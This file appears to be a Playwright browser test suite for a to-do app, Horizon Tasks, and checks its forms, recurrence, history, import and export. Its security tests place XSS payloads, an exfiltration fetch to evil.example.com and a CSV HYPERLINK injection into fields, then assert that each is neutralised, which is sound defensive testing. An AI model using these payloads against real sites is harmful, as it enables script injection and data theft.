// Browser test suite against the production build with a mocked Supabase.
// Run: npm run e2e   (see e2e/run.sh; needs Playwright + a Chromium).
import { chromium } from 'playwright'
import { createMock, session } from './mock.mjs'
const BASE = process.env.BASE ?? 'http://localhost:5198/'
const OUT = process.env.E2E_OUT ?? '/tmp'
const iso = (k = 0) => { const d = new Date(); d.setDate(d.getDate() + k); return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}` }
const results = []
const browser = await chromium.launch(process.env.CHROMIUM_PATH ? { executablePath: process.env.CHROMIUM_PATH } : {})

async function scenario(name, fn, { signedOut = false } = {}) {
  const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, serviceWorkers: 'block' })
  const page = await ctx.newPage()
  const mock = createMock()
  const errors = []
  page.on('pageerror', (e) => !/surprise failure/.test(e.message) && errors.push(e.message))
  page.on('console', (m) => m.type() === 'error' && !/Content Security Policy|Failed to load resource/.test(m.text()) && errors.push(m.text()))
  await page.route('http://mock.supabase.local/**', mock.handler)
  if (!signedOut) await page.addInitScript((s) => { try { localStorage.setItem('sb-mock-auth-token', s) } catch {} }, session('11111111-1111-1111-1111-111111111111'))
  try {
    await fn({ page, mock, ctx })
    if (errors.length) throw new Error('page errors: ' + errors.join(' | '))
    results.push(['PASS', name])
  } catch (e) {
    results.push(['FAIL', name, e.message.split('\n')[0]])
    await page.screenshot({ path: `${OUT}/fail-${name.replace(/\W+/g, '_')}.png`, fullPage: true }).catch(() => {})
  }
  await ctx.close()
}

const dlg = (page) => page.getByRole('dialog')
async function openForm(page) {
  await page.getByRole('button', { name: 'Add task', exact: true }).click()
  await page.getByRole('menuitem', { name: 'Add task' }).click()
}
async function boot(page) { await page.goto(BASE); await page.getByText('Due today', { exact: true }).waitFor() }
async function newTask(page, { title, p = 'P3', cat = 'Admin', due = iso(), forever = false, repeat, end, check, notes }) {
  await openForm(page)
  await dlg(page).locator('input[type=text]').first().fill(title)
  await page.getByRole('button', { name: p, exact: true }).click()
  await dlg(page).getByRole('button', { name: cat, exact: true }).click()
  if (forever) await page.getByText('Forever / ongoing').click()
  if (due) await dlg(page).locator('input[type=date]').first().fill(due)
  if (repeat) {
    await page.getByText('Repeats').click()
    await dlg(page).locator('input[type=number]').fill(String(repeat))
    if (end) await dlg(page).locator('input[type=date]').nth(1).fill(end)
  }
  if (notes) await dlg(page).locator('textarea').fill(notes)
  if (check) { await page.getByRole('button', { name: '+ Add item' }).click(); await dlg(page).locator('.checklist-item input[type=text]').last().fill(check) }
  await page.getByRole('button', { name: 'Save' }).click()
}
const row = (page, text) => page.locator('.task-row', { hasText: text }).first()

await scenario('XSS payloads render as inert text everywhere', async ({ page }) => {
  await boot(page)
  await openForm(page)
  await page.getByRole('button', { name: '+ New' }).click()
  await page.getByPlaceholder('Category name').fill('<img src=x onerror="window.__xss=4">')
  await page.getByRole('button', { name: 'Add', exact: true }).click()
  await dlg(page).locator('input[type=text]').first().fill('<img src=x onerror="window.__xss=1">')
  await page.getByRole('button', { name: 'P3', exact: true }).click()
  await dlg(page).locator('input[type=date]').first().fill(iso())
  await dlg(page).locator('textarea').fill('<script>window.__xss=2</script>\n<a href="javascript:window.__xss=5">x</a>')
  await page.getByRole('button', { name: '+ Add item' }).click()
  await dlg(page).locator('.checklist-item input[type=text]').fill('<svg onload="window.__xss=3">')
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText('Task added.', { exact: true }).waitFor()
  await row(page, '<img src=x').click()
  await page.getByText('<script>window.__xss=2</script>', { exact: false }).waitFor()
  const r = await page.evaluate(() => ({ xss: window.__xss, imgs: document.querySelectorAll('img').length, svgs: document.querySelectorAll('.sheet svg, .task-row svg').length, anchors: document.querySelectorAll('.sheet a').length }))
  if (r.xss !== undefined || r.imgs || r.svgs || r.anchors) throw new Error('XSS: ' + JSON.stringify(r))
})

await scenario('CSP blocks injected inline scripts', async ({ page }) => {
  await boot(page)
  const csp = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content'))
  if (!csp?.includes("script-src 'self'")) throw new Error('no CSP meta: ' + csp)
  await page.evaluate(() => { const s = document.createElement('script'); s.textContent = 'window.__csp = 1'; document.body.appendChild(s) })
  await page.waitForTimeout(200)
  if (await page.evaluate(() => window.__csp)) throw new Error('inline script ran')
  const ext = await page.evaluate(() => fetch('https://evil.example.com/steal').then(() => 'sent', () => 'blocked'))
  if (ext !== 'blocked') throw new Error('exfiltration fetch not blocked')
})

await scenario('Refuses to run inside a frame (clickjacking)', async ({ page }) => {
  await page.setContent(`<iframe id="f" src="${BASE}" width="390" height="600"></iframe>`)
  const frame = await (await page.waitForSelector('#f')).contentFrame()
  await frame.getByText("can't be embedded").waitFor({ timeout: 10000 })
})

await scenario('Double-tap Save creates exactly one task', async ({ page, mock }) => {
  await boot(page)
  await openForm(page)
  await dlg(page).locator('input[type=text]').first().fill('Only once')
  await page.getByRole('button', { name: 'P2', exact: true }).click()
  await dlg(page).getByRole('button', { name: 'Admin', exact: true }).click()
  await dlg(page).locator('input[type=date]').first().fill(iso())
  await page.evaluate(() => { const b = [...document.querySelectorAll('button')].find((x) => x.textContent === 'Save'); b.click(); b.click(); b.click() })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await page.waitForTimeout(400)
  const n = mock.db.tasks.filter((t) => t.title === 'Only once').length
  if (n !== 1 || mock.calls.apply !== 1) throw new Error(`inserted ${n}, rpc calls ${mock.calls.apply}`)
})

await scenario('Double-tap Complete completes once', async ({ page, mock }) => {
  await boot(page)
  await newTask(page, { title: 'Tap me', repeat: 3 })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await page.evaluate(() => { const b = document.querySelector('button[aria-label^="Complete “Tap me"]'); b.click(); b.click() })
  await page.getByText(/Completed — next due/).waitFor()
  await page.waitForTimeout(400)
  if (mock.db.completions.length !== 1 || mock.db.tasks.length !== 1) throw new Error(`completions ${mock.db.completions.length}, tasks ${mock.db.tasks.length}`)
})

await scenario('Server error on save is shown and nothing is lost', async ({ page, mock }) => {
  await boot(page)
  mock.faults.failWrite = 1
  await newTask(page, { title: 'Retry me' })
  await page.getByText('simulated server error').waitFor()
  if ((await dlg(page).locator('input[type=text]').first().inputValue()) !== 'Retry me') throw new Error('form lost input')
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText('Task added.', { exact: true }).waitFor()
})

await scenario('Network failure on complete is shown', async ({ page, mock }) => {
  await boot(page)
  await newTask(page, { title: 'Offline one' })
  await page.getByText('Task added.', { exact: true }).waitFor()
  mock.faults.abortWrite = 1
  await page.getByRole('button', { name: 'Complete “Offline one”' }).first().click()
  await page.getByText(/Couldn't save/).waitFor()
  if (mock.db.tasks.length !== 1) throw new Error('task vanished')
  await row(page, 'Offline one').waitFor()
})

await scenario('Load failure shows error with working Retry', async ({ page, mock }) => {
  mock.faults.failLoad = 1000 // more than the client library's automatic retries
  await page.goto(BASE)
  await page.getByText(/Couldn't load your tasks/).waitFor({ timeout: 60000 })
  mock.faults.failLoad = 0
  await page.getByRole('button', { name: 'Retry' }).click()
  await page.getByText('Due today', { exact: true }).waitFor()
})

await scenario('Edit task + checklist toggle persist', async ({ page, mock }) => {
  await boot(page)
  await newTask(page, { title: 'Edit me', check: 'step one' })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await row(page, 'Edit me').click()
  await page.locator('.checklist-view input').click()
  await page.locator('.checklist-view input:checked').waitFor()
  if (!mock.db.tasks[0].checklist[0].done) throw new Error('checklist toggle not saved')
  await page.getByRole('button', { name: 'Edit', exact: true }).click()
  await dlg(page).locator('input[type=text]').first().fill('Edited title')
  await page.getByRole('button', { name: 'P5', exact: true }).click()
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText('Task updated.').waitFor()
  const t = mock.db.tasks[0]
  if (t.title !== 'Edited title' || t.priority !== 5 || !t.checklist[0].done) throw new Error(JSON.stringify(t))
})

await scenario('Parent cannot move earlier than its subtask', async ({ page }) => {
  await boot(page)
  await newTask(page, { title: 'Parent', due: iso(5) })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await page.locator('.cal-cell', { has: page.locator('.cnt') }).first().click()
  await row(page, 'Parent').click()
  await page.getByRole('button', { name: '+ Add subtask' }).click()
  await dlg(page).locator('input[type=text]').first().fill('Child')
  await page.getByRole('button', { name: 'P2', exact: true }).click()
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText('Category is required.').waitFor() // no category default (spec)
  await dlg(page).getByRole('button', { name: 'Admin', exact: true }).click()
  await dlg(page).locator('input[type=date]').first().fill(iso(4))
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText('Subtask added.').waitFor()
  await page.getByRole('button', { name: 'Edit' }).click()
  await dlg(page).locator('input[type=date]').first().fill(iso(3))
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText(/Subtask “Child” is due after this date/).waitFor()
})

await scenario('Recurrence end date stops the series', async ({ page, mock }) => {
  await boot(page)
  await newTask(page, { title: 'Last one', repeat: 7, end: iso(3) })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await page.getByRole('button', { name: 'Complete “Last one”' }).first().click()
  await page.getByText('Completed.', { exact: true }).waitFor()
  if (mock.db.tasks.length !== 0) throw new Error('spawned occurrence past end date')
})

await scenario('Max nesting depth hides Add subtask at level 4', async ({ page }) => {
  await boot(page)
  await newTask(page, { title: 'L0', due: iso() })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await row(page, 'L0').click()
  for (let i = 1; i <= 4; i++) {
    await page.getByRole('button', { name: '+ Add subtask' }).click()
    await dlg(page).locator('input[type=text]').first().fill(`L${i}`)
    await page.getByRole('button', { name: 'P1', exact: true }).click()
    await dlg(page).getByRole('button', { name: 'Admin', exact: true }).click()
    await page.getByRole('button', { name: 'Save' }).click()
    await page.getByText('Subtask added.').waitFor()
    await dlg(page).locator('.task-row', { hasText: `L${i}` }).click()
    await page.getByRole('dialog', { name: `L${i}` }).waitFor()
  }
  if (await page.getByRole('button', { name: '+ Add subtask' }).count()) throw new Error('depth 4 can add subtask')
  await page.getByRole('dialog').getByText('↳ L0 › L1 › L2 › L3', { exact: true }).waitFor()
})

await scenario('Forever task with a due date shows in Daily and Forever', async ({ page }) => {
  await boot(page)
  await newTask(page, { title: 'Ongoing today', forever: true, due: iso() })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await page.getByRole('button', { name: 'Daily' }).click()
  await row(page, 'Ongoing today').waitFor()
  await page.getByRole('button', { name: 'Forever', exact: true }).click()
  await row(page, 'Ongoing today').waitFor()
})

await scenario('Escape closes sheets; invalid recurrence rejected', async ({ page }) => {
  await boot(page)
  await openForm(page)
  await dlg(page).locator('input[type=text]').first().fill('R')
  await page.getByRole('button', { name: 'P1', exact: true }).click()
  await dlg(page).getByRole('button', { name: 'Admin', exact: true }).click()
  await dlg(page).locator('input[type=date]').first().fill(iso())
  await page.getByText('Repeats').click()
  await dlg(page).locator('input[type=number]').fill('2.5')
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText('Repeat interval must be a whole number').waitFor()
  await page.keyboard.press('Escape')
  if (await dlg(page).count()) throw new Error('Escape did not close')
})

await scenario('Delete asks first and cascades', async ({ page, mock }) => {
  await boot(page)
  await newTask(page, { title: 'Doomed' })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await row(page, 'Doomed').click()
  await page.getByRole('button', { name: '+ Add subtask' }).click()
  await dlg(page).locator('input[type=text]').first().fill('Doomed child')
  await page.getByRole('button', { name: 'P1', exact: true }).click()
  await dlg(page).getByRole('button', { name: 'Admin', exact: true }).click()
  await dlg(page).locator('input[type=date]').first().fill(iso())
  await page.getByRole('button', { name: 'Save' }).click()
  await page.getByText('Subtask added.').waitFor()
  await page.getByRole('button', { name: 'Delete' }).click()
  await page.getByText('and its 1 open subtask(s)').waitFor()
  if (mock.db.tasks.length !== 2) throw new Error('deleted before confirming')
  await page.getByRole('button', { name: 'Delete' }).last().click()
  await page.getByText('Deleted.', { exact: true }).waitFor()
  if (mock.db.tasks.length !== 0 || mock.db.completions.length !== 0) throw new Error('bad cascade')
})

await scenario('Checklist: a fast double tap is never silently dropped', async ({ page, mock }) => {
  await boot(page)
  await newTask(page, { title: 'Box', check: 'item' })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await row(page, 'Box').click()
  const box = page.locator('.checklist-view input')
  await box.click()
  await box.click({ force: true })
  if (!(await box.isDisabled())) throw new Error('not locked during save')
  await page.locator('.checklist-view input:checked:enabled').waitFor()
  await box.click()
  await page.locator('.checklist-view input:not(:checked):enabled').waitFor()
  await page.waitForTimeout(300)
  if (mock.db.tasks[0].checklist[0].done !== false || mock.calls.apply !== 3) throw new Error(`db ${JSON.stringify(mock.db.tasks[0].checklist)} calls ${mock.calls.apply}`)
})

await scenario('Task removed on another device closes its open sheet', async ({ page, mock }) => {
  await boot(page)
  await newTask(page, { title: 'Elsewhere' })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await row(page, 'Elsewhere').click()
  mock.db.tasks = [] // completed on the phone
  await page.evaluate(() => document.dispatchEvent(new Event('visibilitychange')))
  await page.getByText('That task was changed on another device.').waitFor()
  if (await dlg(page).count()) throw new Error('sheet still open')
})

await scenario('Failed Google sign-in shows its reason and cleans the URL', async ({ page }) => {
  await page.goto(BASE + '?error=access_denied&error_description=User+cancelled+%3Cb%3Ex%3C%2Fb%3E')
  await page.getByText('Sign-in failed: User cancelled <b>x</b>').waitFor()
  if (page.url().includes('error')) throw new Error('URL not cleaned: ' + page.url())
  if (await page.locator('b').count()) throw new Error('HTML rendered')
}, { signedOut: true })

await scenario('Keyboard: Tab to a task and press Enter to open it', async ({ page }) => {
  await boot(page)
  await newTask(page, { title: 'Keys' })
  await page.getByText('Task added.', { exact: true }).waitFor()
  await row(page, 'Keys').focus()
  await page.keyboard.press('Enter')
  await page.getByRole('dialog', { name: 'Keys' }).waitFor()
})

await scenario('Unexpected errors are shown, not swallowed', async ({ page }) => {
  await boot(page)
  await page.evaluate(() => { setTimeout(() => Promise.reject(new Error('surprise failure')), 0) })
  await page.getByText('Something went wrong: surprise failure').waitFor()
})

const U = (n) => `00000000-0000-4000-8000-${String(n).padStart(12, '0')}`

await scenario('Overdue popup: opens once per app open; Dismiss / Not needed / Complete', async ({ page, mock }) => {
  mock.seed([
    { id: U(1), title: 'Old report', due_date: iso(-10), priority: 5 },
    { id: U(2), title: 'Water plants', due_date: iso(-3), recurrence_every_n_days: 7 },
    { id: U(3), title: 'Big project', due_date: iso(-1) },
    { id: U(4), title: 'Sub step', due_date: iso(-2), parent_id: U(3), depth: 1 },
    { id: U(5), title: 'Future thing', due_date: iso(5) },
  ])
  await page.goto(BASE)
  await page.getByRole('dialog', { name: '4 overdue' }).waitFor()
  const item = (t) => dlg(page).locator('.popup-item', { has: page.locator('.task-title', { hasText: new RegExp(`^${t}$`) }) })
  await item('Old report').getByRole('button', { name: 'Dismiss' }).click()
  await page.getByRole('dialog', { name: '3 overdue' }).waitFor()
  if (mock.calls.apply !== 0) throw new Error('Dismiss wrote data')
  await item('Water plants').getByRole('button', { name: 'Not needed' }).click()
  await page.getByText(`Marked not needed — next due ${iso(4)}.`).waitFor()
  await item('Big project').getByRole('button', { name: 'Complete' }).click()
  await item('Big project').getByText('Also completes its 1 open subtask(s)').waitFor()
  if (mock.calls.apply !== 1) throw new Error('completed without confirming')
  await item('Big project').getByRole('button', { name: 'Confirm complete' }).click()
  await page.getByRole('dialog', { name: 'All caught up' }).waitFor()
  const hist = mock.db.completions.map((c) => [c.snapshot.title, c.outcome]).sort()
  if (JSON.stringify(hist) !== JSON.stringify([['Big project', 'completed'], ['Sub step', 'completed'], ['Water plants', 'skipped']])) throw new Error(JSON.stringify(hist))
  await dlg(page).getByRole('button', { name: 'Close' }).last().click()
  // Old report is still overdue; the popup doesn't reopen on its own during this app open…
  await page.evaluate(() => document.dispatchEvent(new Event('visibilitychange')))
  await page.waitForTimeout(500)
  if (await dlg(page).count()) throw new Error('popup reopened by itself')
  // …but the header pill opens it on demand.
  await page.getByRole('button', { name: '1 overdue' }).click()
  await dlg(page).locator('.popup-item', { hasText: 'Old report' }).waitFor()
})

await scenario('Weekly / Monthly / Later tabs place tasks correctly', async ({ page, mock }) => {
  const nextMonth = (() => { const d = new Date(); return `${d.getFullYear() + (d.getMonth() === 11 ? 1 : 0)}-${String(((d.getMonth() + 1) % 12) + 1).padStart(2, '0')}-15` })()
  mock.seed([
    { id: U(1), title: 'Today task', due_date: iso(0) },
    { id: U(2), title: 'In 20 days', due_date: iso(20) },
    { id: U(3), title: 'Far future', due_date: '2099-01-01' },
    { id: U(4), title: 'Next month', due_date: nextMonth },
  ])
  await boot(page)
  await page.getByRole('button', { name: 'Weekly' }).click()
  await row(page, 'Today task').waitFor()
  if (await row(page, 'In 20 days').count()) throw new Error('20 days in weekly')
  await page.getByRole('button', { name: 'Calendar' }).click()
  await page.locator('.cal-cell.today').click()
  await dlg(page).count() // no dialog expected
  await page.locator('.cal-day-list .task-row', { hasText: 'Today task' }).waitFor()
  await page.getByRole('button', { name: 'Monthly' }).click()
  await row(page, 'In 20 days').waitFor()
  if (await row(page, 'Far future').count()) throw new Error('far future in monthly list')
  await page.getByRole('button', { name: 'Calendar' }).click()
  await page.getByRole('button', { name: 'Next month' }).click()
  await page.locator(`.cal-cell[aria-label^="${nextMonth}"]`).click()
  await page.locator('.cal-day-list .task-row', { hasText: 'Next month' }).waitFor()
  await page.getByRole('button', { name: 'Later' }).click()
  await row(page, 'Far future').waitFor()
  await row(page, 'Next month').waitFor()
  if (await row(page, 'Today task').count()) throw new Error('today in later')
})

await scenario('Quick add: blank rows ignored, all-or-nothing, one atomic write, resets', async ({ page, mock }) => {
  await boot(page)
  await page.getByRole('button', { name: 'Add task', exact: true }).click()
  await page.getByRole('menuitem', { name: 'Quick add' }).click()
  const fill = async (i, title, due, p, cat) => {
    await page.getByLabel(`Row ${i} title`).fill(title)
    if (due) await page.getByLabel(`Row ${i} due date`).fill(due)
    if (p) await page.getByLabel(`Row ${i} priority`).selectOption(String(p))
    if (cat) await page.getByLabel(`Row ${i} category`).selectOption({ label: cat })
  }
  await fill(1, 'QA one', iso(1), 2, 'MPH')
  await fill(3, 'QA three <b>x</b>', iso(2), 4, 'Admin')
  await fill(5, 'QA five', iso(3), null, 'KFAM') // missing priority
  await page.getByRole('button', { name: 'Save all' }).click()
  await page.getByText('Nothing was saved').waitFor()
  await page.locator('.qa-row.has-error').getByText('Priority must be a whole number').waitFor()
  if (mock.calls.apply !== 0 || mock.db.tasks.length) throw new Error('partial save')
  await page.getByLabel('Row 5 priority').selectOption('1')
  await page.getByRole('button', { name: 'Save all' }).click()
  await page.getByText('Added 3 tasks.').waitFor()
  if (mock.calls.apply !== 1 || mock.db.tasks.length !== 3) throw new Error(`calls ${mock.calls.apply}, tasks ${mock.db.tasks.length}`)
  if (await page.getByLabel('Row 1 title').inputValue()) throw new Error('form not reset')
  await dlg(page).waitFor() // stays open for another burst
  await page.getByRole('button', { name: 'Save all' }).click()
  await page.getByText('Type a title in at least one row.').waitFor()
})

await scenario('History: restore reattaches, permanent delete asks first', async ({ page, mock }) => {
  mock.seed([
    { id: U(1), title: 'Parent P', due_date: iso(3) },
    { id: U(2), title: 'Child C', due_date: iso(2), parent_id: U(1), depth: 1 },
    { id: U(3), title: 'Solo', due_date: iso(1) },
  ])
  await boot(page)
  await page.getByRole('button', { name: 'Complete “Child C”' }).first().click()
  await page.getByText('Completed.', { exact: true }).waitFor()
  await page.getByRole('button', { name: 'Complete “Solo”' }).first().click()
  await page.getByText('Completed.', { exact: true }).waitFor()
  await page.getByRole('button', { name: 'History' }).click()
  await page.getByText('History · 2').waitFor()
  await page.getByRole('button', { name: 'Restore “Child C”' }).click()
  await page.getByText('Restored under “Parent P”.').waitFor()
  const c = mock.db.tasks.find((t) => t.title === 'Child C')
  if (!c || c.parent_id !== U(1) || c.depth !== 1) throw new Error('not reattached ' + JSON.stringify(c))
  await page.getByRole('button', { name: 'Delete “Solo” permanently' }).click()
  await page.getByText("can't be undone").waitFor()
  if (mock.db.completions.length !== 1) throw new Error('deleted before confirm')
  await page.getByRole('button', { name: 'Delete forever' }).click()
  await page.getByText('Deleted from history.').waitFor()
  if (mock.db.completions.length !== 0) throw new Error('not deleted')
  await page.getByText('Nothing completed yet.').waitFor()
})

await scenario('Export CSV is formula-safe; JSON re-import is idempotent', async ({ page, mock }) => {
  mock.seed([{ id: U(1), title: '=HYPERLINK("http://evil.example","click")', due_date: iso(1) }, { id: U(2), title: 'Plain', due_date: iso(1) }])
  await boot(page)
  await page.getByRole('button', { name: 'History' }).click()
  const [csv] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name: 'CSV' }).click()])
  const csvText = await (await import('node:fs/promises')).readFile(await csv.path(), 'utf8')
  if (!csvText.includes(`"'=HYPERLINK(`)) throw new Error('formula not neutralized: ' + csvText.split('\n')[1])
  const [json] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name: 'Export JSON' }).click()])
  const jsonPath = await json.path()
  if (!/horizon-tasks-\d{4}-\d{2}-\d{2}\.json/.test(json.suggestedFilename())) throw new Error(json.suggestedFilename())
  await page.getByRole('button', { name: 'Import' }).click()
  await page.getByLabel('Export file').setInputFiles(jsonPath)
  await page.getByText('2 already here — skipped').waitFor()
  if (!(await page.getByRole('button', { name: 'Import', exact: true }).last().isDisabled())) throw new Error('import enabled with nothing to add')
})

await scenario('Import from the v4 artifact: preview, adjustments, atomic write', async ({ page, mock }) => {
  const file = {
    schemaVersion: 1,
    categories: [{ id: 'a1', name: 'MPH', color: '#5b8cff' }, { id: 'a2', name: 'Gym <img src=x onerror=window.__xss=9>', color: '#f2789a' }],
    tasks: [
      { id: 't1', title: 'Thesis', priority: 5, categoryId: 'a1', dueDate: iso(10), checklist: [{ text: 'outline', done: true }] },
      { id: 't2', title: 'Chapter 1', priority: 4, categoryId: 'a1', dueDate: iso(5), parentId: 't1', depth: 1 },
      { id: 't3', title: 'Late child', priority: 4, categoryId: 'a1', dueDate: iso(30), parentId: 't1', depth: 1 },
      { id: 't4', title: 'Lift <script>window.__xss=8</script>', priority: 2, categoryId: 'a2', dueDate: iso(1), recurrence: { everyNDays: 2, endDate: null } },
      { id: 't5', title: 'Bad', priority: 3.7, categoryId: 'a1', dueDate: iso(1) },
    ],
    completions: [{ id: 'h1', title: 'Done before', categoryId: 'a2', priority: 2, parentId: null, parentTitle: null, dueDate: iso(-5), completedAt: iso(-4), outcome: 'completed' }],
  }
  mock.seed([])
  await boot(page)
  await page.getByRole('button', { name: 'History' }).click()
  await page.getByRole('button', { name: 'Import' }).click()
  await page.getByLabel('Export file').setInputFiles({ name: 'export.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(file)) })
  await dlg(page).getByText('4', { exact: true }).first().waitFor()
  await dlg(page).getByText(/Late child.*due after its parent/).waitFor()
  await dlg(page).getByText(/Skipped “Bad”/).waitFor()
  if (mock.calls.apply !== 0 || mock.db.tasks.length) throw new Error('wrote during preview')
  await page.getByRole('button', { name: 'Import', exact: true }).last().click()
  await page.getByText('Imported 4 task(s) and 1 history entry.').waitFor()
  if (mock.calls.apply !== 1) throw new Error('not one atomic write: ' + mock.calls.apply)
  const thesis = mock.db.tasks.find((t) => t.title === 'Thesis')
  if (mock.db.tasks.find((t) => t.title === 'Chapter 1').parent_id !== thesis.id) throw new Error('structure lost')
  if (!mock.db.categories.some((c) => c.name.startsWith('Gym'))) throw new Error('category not created')
  await page.getByRole('button', { name: 'Daily' }).click()
  await page.getByRole('button', { name: 'Weekly' }).click()
  await row(page, 'Lift <script>').waitFor()
  if (await page.evaluate(() => window.__xss)) throw new Error('XSS from import')
})

await scenario('Rejects a non-export file with a clear message', async ({ page }) => {
  await boot(page)
  await page.getByRole('button', { name: 'History' }).click()
  await page.getByRole('button', { name: 'Import' }).click()
  await page.getByLabel('Export file').setInputFiles({ name: 'x.json', mimeType: 'application/json', buffer: Buffer.from('{"hello": "world"}') })
  await page.getByText("doesn't look like a Horizon Tasks export").waitFor()
  await page.getByLabel('Export file').setInputFiles({ name: 'x.json', mimeType: 'application/json', buffer: Buffer.from('<html>') })
  await page.getByText("isn't valid JSON").waitFor()
})

await scenario('App icons and manifest are served', async ({ page }) => {
  await page.goto(BASE)
  for (const f of ['manifest.webmanifest', 'icon-192.png', 'icon-512.png', 'icon-maskable-512.png', 'apple-touch-icon.png', 'privacy.html']) {
    const r = await page.request.get(BASE + f)
    if (!r.ok()) throw new Error(`${f}: ${r.status()}`)
  }
})

await browser.close()
for (const r of results) console.log(r.join('  '))
const passed = results.filter((r) => r[0] === 'PASS').length
console.log(`${passed}/${results.length} passed`)
process.exit(passed === results.length ? 0 : 1)
